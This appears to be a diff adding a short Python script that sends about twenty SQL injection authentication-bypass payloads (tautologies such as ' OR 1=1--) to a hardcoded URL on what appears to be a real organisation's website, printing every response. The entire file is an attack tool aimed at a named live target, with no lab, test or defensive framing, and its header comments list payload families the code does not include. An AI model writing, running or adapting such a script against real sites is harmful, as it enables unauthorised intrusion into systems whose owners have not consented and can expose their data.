@@ -1,0 +1,43 @@
+#SQL Injection Auth Bypass Payloads 
+#Generic Error Based Payloads 
+#Generic Union Select Payloads
+
+import requests
+
+def sql_injection_attack():
+    # URL vulnerable to SQL injection
+    url = "https://www.cnps.cm/index.php/en/?id=7"
+
+    # Payloads for SQL injection
+    payloads = [
+        "' OR '1'='1'--",
+        "' OR '1'='1'; --",
+        "' OR '1'='1'/*",
+        "' OR '1'='1';#",
+        "' OR '1'='1';--",
+        "' OR '1'='1'--",
+        "' OR 1=1--",
+        "' OR 1=1;",
+        "' OR 1=1;--",
+        "' OR 1=1;#",
+        "' OR 1=1/*",
+        "' OR 1=1--",
+        "' OR 1=1; --",
+        "' OR 'x'='x'--",
+        "' OR 'x'='x';--",
+        "' OR 'x'='x';#",
+        "' OR 'x'='x';--",
+        "' OR 'x'='x';/*",
+        "' OR 1=1#",
+        "' OR 1=1/*"
+    ]
+
+    # Send GET requests with each payload
+    for payload in payloads:
+        response = requests.get(url + payload)
+        print(f"Payload: {payload}")
+        print(response.text)
+        print("-" * 50)
+
+if __name__ == "__main__":
+    sql_injection_attack()
